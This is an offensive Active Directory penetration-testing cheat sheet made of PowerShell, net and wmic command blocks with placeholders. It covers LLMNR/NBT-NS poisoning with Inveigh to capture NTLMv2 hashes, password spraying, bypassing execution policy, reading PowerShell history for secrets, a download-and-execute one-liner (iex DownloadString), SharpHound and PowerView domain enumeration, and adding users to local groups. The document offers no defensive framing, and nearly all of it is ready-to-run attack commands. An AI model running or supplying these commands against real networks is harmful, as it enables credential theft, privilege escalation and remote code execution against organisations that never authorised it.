### Listen for hashes - LLMNR/NBT-NS Poisoning:
```
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
HELP
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```
### Check Defender and Applocker:
```
Get-MpComputerStatus
Get-AppLockerPolicy
```
### Password Policy:
```
net accounts

Import-Module .\PowerView.ps1
Get-DomainPolicy
```
### Password Spraying:
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile <FILE> -ErrorAction SilentlyContinue
```
### Powershell

```
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>'); <COMMANDS>"
```
### PowerView Module:
```
Get-DomainUser -Identity <USERNAME> -Domain <DOMAIN>
Get-DomainGroupMember -Identity <GROUP> -Recurse
Get-DomainTrustMapping
```
### ActiveDirectory Module:
```
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity <GROUP>
Get-ADGroupMember -Identity <GROUP>
Test-AdminAccess -ComputerName <HOSTNAME>
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Bloodhound Collection:
```
.\SharpHound.exe -c All --zipfilename <FILE>
```
### WMI:
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
### Net:
```
net accounts /domain
net groups /domain 
net group <GROUP> /domain
net localgroup <GROUP>
net localgroup <GROUP> <USERNAME> /add
net share
net user <USER> /domain
net use Z: <SHARE>
net view 
net view /domain
```
